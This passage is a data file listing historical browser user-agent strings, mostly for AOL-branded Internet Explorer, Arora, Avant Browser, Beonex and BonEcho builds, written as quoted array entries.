"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; GTB5; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; YComp 5.0.0.0; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1; (R1 1.3); .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; Q312461)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts; SV1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts; SV1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; (R1 1.3))",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1) (Compatible; ; ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; YComp 5.0.2.6; Hotbar 4.2.8.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; YComp 5.0.2.4)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; YComp 5.0.0.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; SV1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Q312461; YComp 5.0.0.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Q312461)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Hotbar 4.2.8.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Hotbar 4.1.7.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows 98; Win 9x 4.90; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows 98; Win 9x 4.90; (R1 1.3))",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows 98; Win 9x 4.90)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 6.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 95)",
"Mozilla/4.0 (compatible; MSIE 5.0; AOL 6.0; Windows 98; DigExt; YComp 5.0.2.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 5.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 5.0; Windows 98; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 5.0; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows NT 5.0)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98; YComp 5.0.0.0)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98; Win 9x 4.90)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 95)",
"Mozilla/4.0 (compatible; MSIE 5.0; AOL 5.0; Windows 98; DigExt)",
"Mozilla/4.0 (compatible; MSIE 5.0; AOL 5.0; Windows 95; DigExt)",
"Mozilla/4.0 (compatible; MSIE 5.0; AOL 5.0; Windows 95)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 4.0; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 5.5; AOL 4.0; Windows 95)",
"Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 98; DigExt)",
"Mozilla/4.0 (compatible; MSIE 5.01; AOL 4.0; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 95)",
"Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K)",
"Mozilla/5.0 (X11; U; UNICOS lcLinux; en-US) Gecko/20140730 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; ; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; ; en-EN) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (X11; U; Linux; ru-RU) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: 802 025a17d)",
"Mozilla/5.0 (X11; U; Linux; fi-FI) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: 754 46b659a)",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
"Mozilla/5.0 (X11; U; Linux; pt-PT) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; nb-NO) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; it-IT) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 413 12f13f8)",
"Mozilla/5.0 (X11; U; Linux; it-IT) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; hu-HU) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 388 835b3b6)",
"Mozilla/5.0 (X11; U; Linux; hu-HU) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; fr-FR) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; es-ES) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 388 835b3b6)",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 388 835b3b6)",
"Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4",
"Mozilla/5.0 (X11; U; Linux; cs-CZ) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 333 41e3bc6)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; pt-BR) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )",
"Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 239 52c6958)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-BE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
"Mozilla/5.0 (X11; U; Linux; sk-SK) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )",
"Mozilla/5.0 (X11; U; Linux; nb-NO) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )",
"Mozilla/5.0 (X11; U; Linux; es-CR) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 189 35c14e0)",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )",
"Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-CH) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Arora/0.11.0 Safari/533.3",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.34 (KHTML, like Gecko) Arora/0.11.0 Safari/534.34",
"Mozilla/5.0 (X11; U; Linux; pl-PL) AppleWebKit/532.4 (KHTML, like Gecko) Arora/0.10.2 Safari/532.4",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Arora/0.10.2 Safari/534.34",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-MY) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.10.0",
"Mozilla/5.0 (Windows; U; ; hu-HU) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.10.0",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6.4; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; chromeframe; Avant Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1; .NET CLR 3.0.4506.",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB5; Avant Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Avant Browser; Avant Browser; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT; Avant Browser; Avant Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E; Avant Browser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; GTB6.3; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Avant Browser; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; InfoPath.2; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Tablet PC 2.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"-Mailnews - email/news client",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (X11; U; OpenBSD ppc; en-US; rv:1.8.1.9) Gecko/20070223 BonEcho/2.0.0.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.9) Gecko/20071103 BonEcho/2.0.0.9",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.9) Gecko/20071113 BonEcho/2.0.0.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.8pre) Gecko/20071012 BonEcho/2.0.0.8pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.7pre) Gecko/20070901 BonEcho/2.0.0.7pre",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.7) Gecko/20070918 BonEcho/2.0.0.7",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.7) Gecko/20071018 BonEcho/2.0.0.7",
"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.6) Gecko/20070812 BonEcho/2.0.0.6",
"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.8.1.5pre) Gecko/20070604 BonEcho/2.0.0.5pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.5pre) Gecko/20070622 BonEcho/2.0.0.5pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4pre) Gecko/20070414 BonEcho/2.0.0.4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.4pre) Gecko/20070510 BonEcho/2.0.0.4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4pre) Gecko/20070416 BonEcho/2.0.0.4pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4pre) Gecko/20070410 BonEcho/2.0.0.4pre",
"Mozilla/5.0 (X11; U; OpenBSD ppc; en-US; rv:1.8.1.4) Gecko/20070223 BonEcho/2.0.0.4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070531 BonEcho/2.0.0.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070416 BonEcho/2.0.0.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.8.1.3pre) Gecko/20070302 BonEcho/2.0.0.3pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3pre) Gecko/20070302 BonEcho/2.0.0.3pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1.3pre) Gecko/20070301 BonEcho/2.0.0.3pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070517 BonEcho/2.0.0.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a3) Gecko/20070409 BonEcho/2.0.0.3",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.3) Gecko/20070329 BonEcho/2.0.0.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.3) Gecko/20070322 BonEcho/2.0.0.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.8.1.2pre) Gecko/20070226 BonEcho/2.0.0.2pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070213 BonEcho/2.0.0.2pre",
"Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.21pre) Gecko/20090218 BonEcho/2.0.0.21pre",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20070302 BonEcho/2.0.0.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20070224 BonEcho/2.0.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070227 BonEcho/2.0.0.2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.2) Gecko/20070223 BonEcho/2.0.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1pre) Gecko/20061203 BonEcho/2.0.0.1pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1pre) Gecko/20061202 BonEcho/2.0.0.1pre",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1pre) Gecko/20061122 BonEcho/2.0.0.1pre",
"Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.18) Gecko/20081114 BonEcho/2.0.0.18",
"Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17",
"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080417 BonEcho/2.0.0.14",
"Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.14) Gecko/20080429 BonEcho/2.0.0.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.13) Gecko/20080401 BonEcho/2.0.0.13",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.12pre) Gecko/20080103 BonEcho/2.0.0.12pre",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080208 BonEcho/2.0.0.12",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.12) Gecko/20080321 BonEcho/2.0.0.12 (SliTaz GNU/Linux)",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.1.11) Gecko/20080208 BonEcho/2.0.0.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071204 BonEcho/2.0.0.11",
"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.1) Gecko/20061219 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux mips; en-US; rv:1.8.1.1) Gecko/20070628 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.1) Gecko/20070117 Epiphany/2.16 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070222 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070220 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070217 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070215 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070115 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.1) Gecko/20070110 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.1) Gecko/20070131 BonEcho/2.0.0.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061222 BonEcho/2.0.0.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061230 BonEcho/2.0.0.1",
"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1",
"Mozilla/5.0 (X11; U; Win95; en-US; rv:1.8.1) Gecko/20061125 BonEcho/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061129 BonEcho/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061031 BonEcho/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061026 BonEcho/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061003 BonEcho/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1) Gecko/20061031 BonEcho/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061210 BonEcho/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061209 BonEcho/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061121 BonEcho/2.0",
